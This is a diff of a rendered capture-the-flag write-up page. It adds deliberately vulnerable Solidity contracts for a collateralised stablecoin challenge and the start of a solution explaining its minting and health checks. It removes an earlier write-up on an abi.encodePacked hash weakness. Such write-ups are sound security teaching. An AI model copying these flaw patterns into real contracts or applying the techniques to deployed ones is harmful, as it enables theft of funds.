+<span class="w">        </span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="nx">configuration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">SystemConfiguration</span><span class="p">(</span><span class="nx">_getArgAddress</span><span class="p">(</span><span class="mf">0</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">configuration</span><span class="p">.</span><span class="nx">isAuthorized</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;NOT_AUTHORIZED&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">debt</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">amount</span><span class="p">;</span>
+
+<span class="w">        </span><span class="nx">emit</span><span class="w"> </span><span class="nx">DebtDecreased</span><span class="p">(</span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">memo</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">isHealthy</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">collateralDecrease</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">debtIncrease</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="nx">configuration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">SystemConfiguration</span><span class="p">(</span><span class="nx">_getArgAddress</span><span class="p">(</span><span class="mf">0</span><span class="p">));</span>
+
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">collateralDecrease</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">totalDebt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">debt</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">debtIncrease</span><span class="p">;</span>
+
+<span class="w">        </span><span class="p">(,</span><span class="w"> </span><span class="nx">int256</span><span class="w"> </span><span class="nx">ethPriceInt</span><span class="p">,,,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">AggregatorV3Interface</span><span class="p">(</span><span class="nx">configuration</span><span class="p">.</span><span class="nx">getEthUsdPriceFeed</span><span class="p">()).</span><span class="nx">latestRoundData</span><span class="p">();</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">ethPriceInt</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">ethPrice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">ethPriceInt</span><span class="p">);</span>
+
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">ethPrice</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1e8</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">totalDebt</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">configuration</span><span class="p">.</span><span class="nx">getCollateralRatio</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">10000</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">recoverAccount</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">newOwner</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">newRecoveryAccounts</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">signatures</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">external</span>
+<span class="w">        </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">Account</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">isHealthy</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;UNHEALTHY_ACCOUNT&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">signHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">chainid</span><span class="p">,</span><span class="w"> </span><span class="nx">_getArgAddress</span><span class="p">(</span><span class="mf">20</span><span class="p">),</span><span class="w"> </span><span class="nx">newOwner</span><span class="p">,</span><span class="w"> </span><span class="nx">newRecoveryAccounts</span><span class="p">));</span>
+
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">numRecoveryAccounts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_getArgUint256</span><span class="p">(</span><span class="mf">40</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">signatures</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">numRecoveryAccounts</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;INCORRECT_LENGTH&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">numRecoveryAccounts</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">require</span><span class="p">(</span>
+<span class="w">                </span><span class="nx">SignatureChecker</span><span class="p">.</span><span class="nx">isValidSignatureNow</span><span class="p">(</span><span class="nx">_getArgAddress</span><span class="p">(</span><span class="mf">72</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">32</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">i</span><span class="p">),</span><span class="w"> </span><span class="nx">signHash</span><span class="p">,</span><span class="w"> </span><span class="nx">signatures</span><span class="p">[</span><span class="nx">i</span><span class="p">]),</span>
+<span class="w">                </span><span class="s2">&quot;INVALID_SIGNATURE&quot;</span>
+<span class="w">            </span><span class="p">);</span>
 <span class="w">        </span><span class="p">}</span>
 
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="nx">configuration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">SystemConfiguration</span><span class="p">(</span><span class="nx">_getArgAddress</span><span class="p">(</span><span class="mf">0</span><span class="p">));</span>
+
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">currentDebt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">debt</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">debt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
+
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">AccountManager</span><span class="p">(</span><span class="nx">configuration</span><span class="p">.</span><span class="nx">getAccountManager</span><span class="p">()).</span><span class="nx">migrateAccount</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">}(</span>
+<span class="w">            </span><span class="nx">newOwner</span><span class="p">,</span><span class="w"> </span><span class="nx">newRecoveryAccounts</span><span class="p">,</span><span class="w"> </span><span class="nx">currentDebt</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+</details>
+<details class="note">
+<summary>AccountManager.sol</summary>
+<div class="highlight"><pre><span></span><code><span class="k">import</span><span class="w"> </span><span class="s2">&quot;@clones-with-immutable-args/src/ClonesWithImmutableArgs.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./Account.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./Stablecoin.sol&quot;</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">AccountManager</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">using</span><span class="w"> </span><span class="nx">ClonesWithImmutableArgs</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">address</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">Account</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">validAccounts</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="nx">configuration</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">SYSTEM_CONFIGURATION</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">configuration</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyValidAccount</span><span class="p">(</span><span class="nx">Account</span><span class="w"> </span><span class="nx">account</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">validAccounts</span><span class="p">[</span><span class="nx">account</span><span class="p">],</span><span class="w"> </span><span class="s2">&quot;INVALID_ACCOUNT&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">openAccount</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">recoveryAddresses</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">Account</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">_openAccount</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">recoveryAddresses</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">migrateAccount</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">recoveryAddresses</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">debt</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">external</span>
+<span class="w">        </span><span class="nx">payable</span>
+<span class="w">        </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">Account</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">Account</span><span class="w"> </span><span class="nx">account</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_openAccount</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">recoveryAddresses</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">account</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">}();</span>
+
+<span class="w">        </span><span class="nx">account</span><span class="p">.</span><span class="nx">increaseDebt</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">debt</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;account migration&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">account</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_openAccount</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">recoveryAddresses</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">Account</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">Account</span><span class="w"> </span><span class="nx">account</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Account</span><span class="p">(</span>
+<span class="w">            </span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">.</span><span class="nx">getAccountImplementation</span><span class="p">().</span><span class="nx">clone</span><span class="p">(</span>
+<span class="w">                </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">,</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">recoveryAddresses</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span><span class="w"> </span><span class="nx">recoveryAddresses</span><span class="p">)</span>
+<span class="w">            </span><span class="p">)</span>
+<span class="w">        </span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">validAccounts</span><span class="p">[</span><span class="nx">account</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">account</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">mintStablecoins</span><span class="p">(</span><span class="nx">Account</span><span class="w"> </span><span class="nx">account</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">memo</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">external</span>
+<span class="w">        </span><span class="nx">onlyValidAccount</span><span class="p">(</span><span class="nx">account</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">account</span><span class="p">.</span><span class="nx">increaseDebt</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">memo</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">Stablecoin</span><span class="p">(</span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">.</span><span class="nx">getStablecoin</span><span class="p">()).</span><span class="nx">mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">burnStablecoins</span><span class="p">(</span><span class="nx">Account</span><span class="w"> </span><span class="nx">account</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">memo</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">external</span>
+<span class="w">        </span><span class="nx">onlyValidAccount</span><span class="p">(</span><span class="nx">account</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">account</span><span class="p">.</span><span class="nx">decreaseDebt</span><span class="p">(</span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">memo</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">Stablecoin</span><span class="p">(</span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">.</span><span class="nx">getStablecoin</span><span class="p">()).</span><span class="nx">burn</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+</details>
+<details class="note">
+<summary>src/Stablecoin.sol</summary>
+<div class="highlight"><pre><span></span><code><span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./SystemConfiguration.sol&quot;</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Stablecoin</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="s2">&quot;US Dollar Stablecoin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USDS&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="nx">configuration</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">SYSTEM_CONFIGURATION</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">configuration</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">mint</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">.</span><span class="nx">isAuthorized</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;NOT_AUTHORIZED&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">burn</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">.</span><span class="nx">isAuthorized</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;NOT_AUTHORIZED&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">_burn</span><span class="p">(</span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
 <span class="w">    </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 </details>
 <h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h2>
 <ul>
-<li>To solve the challenge, the ether balance of both <code>SPLIT</code> and <code>_splitsById[0].wallet</code> should be 0</li>
-<li>The <code>distribute()</code> function of <code>Split</code> can be used to distribute the specific asset in the <code>SplitWallet</code>, based on the <code>accounts</code> and <code>percents</code> that are specified during the creation of the <code>SplitWallet</code>. After distribution, users can withdraw based on the value stored in <code>balances</code></li>
+<li>The challenge is solved if the total supply of <code>Stablecoin</code> is greater than <span class="arithmatex">\(10^{12} \times 10^{18}\)</span></li>
+<li>Accounts authorized by the <code>SystemConfiguration</code> contract can mint stable coins. Only the owner of <code>SystemConfiguration</code> can update system contracts (i.e. authorized accounts) and the <code>AccountManager</code> contract is the only authorized contract</li>
 <li>
-<p>However, <code>distribute()</code> simply validates the parameters by comparing the hash of <code>abi.encodePacked</code> result, while both <code>accounts</code> and <code>percents</code> are dynamic types. Thus, <code>accounts</code> and <code>percents</code> can be slightly adjusted during distribution</p>
-<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">_distribute</span><span class="p">(</span>
-<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">splitId</span><span class="p">,</span>
-<span class="w">    </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span>
-<span class="w">    </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span>
-<span class="w">    </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">,</span>
-<span class="w">    </span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">token</span>
-<span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">_splitsById</span><span class="p">[</span><span class="nx">splitId</span><span class="p">].</span><span class="nx">hash</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_hashSplit</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">));</span>
-<span class="w">    </span><span class="p">...</span>
-<span class="p">}</span>
-
-<span class="kd">function</span><span class="w"> </span><span class="nx">_hashSplit</span><span class="p">(</span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">)</span>
-<span class="w">    </span><span class="nx">internal</span>
-<span class="w">    </span><span class="nx">pure</span>
-<span class="w">    </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes32</span><span class="p">)</span>
+<p>In the <code>AccountManager</code> contract, only valid accounts can mint stable coins. Meanwhile, the debt on the account will increase</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">mintStablecoins</span><span class="p">(</span><span class="nx">Account</span><span class="w"> </span><span class="nx">account</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">memo</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">external</span>
+<span class="w">    </span><span class="nx">onlyValidAccount</span><span class="p">(</span><span class="nx">account</span><span class="p">)</span>
 <span class="p">{</span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">));</span>
+<span class="w">    </span><span class="nx">account</span><span class="p">.</span><span class="nx">increaseDebt</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">memo</span><span class="p">);</span>
+
+<span class="w">    </span><span class="nx">Stablecoin</span><span class="p">(</span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">.</span><span class="nx">getStablecoin</span><span class="p">()).</span><span class="nx">mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
 <span class="p">}</span>
 </code></pre></div>
 </li>
 <li>
-<p>During the creation of <code>SplitWallet{id: 0}</code>, index 1 account has been accidentally left uninitialized</p>
-<div class="highlight"><pre><span></span><code><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">addrs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">address</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
-<span class="nx">addrs</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mh">0x000000000000000000000000000000000000dEaD</span><span class="p">);</span>
-<span class="nx">addrs</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mh">0x000000000000000000000000000000000000bEEF</span><span class="p">);</span>
+<p>In the <code>increaseDebt()</code> function, if the account is not healthy after the debt is increased, the transaction will fail. However, the player don't have enough ETH to mint <span class="arithmatex">\(10^{12}\)</span> stable coins and keep the account healthy</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">increaseDebt</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">operator</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">memo</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">isHealthy</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;NOT_HEALTHY&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">debt</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">amount</span><span class="p">;</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">isHealthy</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">collateralDecrease</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">debtIncrease</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">collateralDecrease</span><span class="p">;</span>
+<span class="w">    </span><span class="p">...</span>
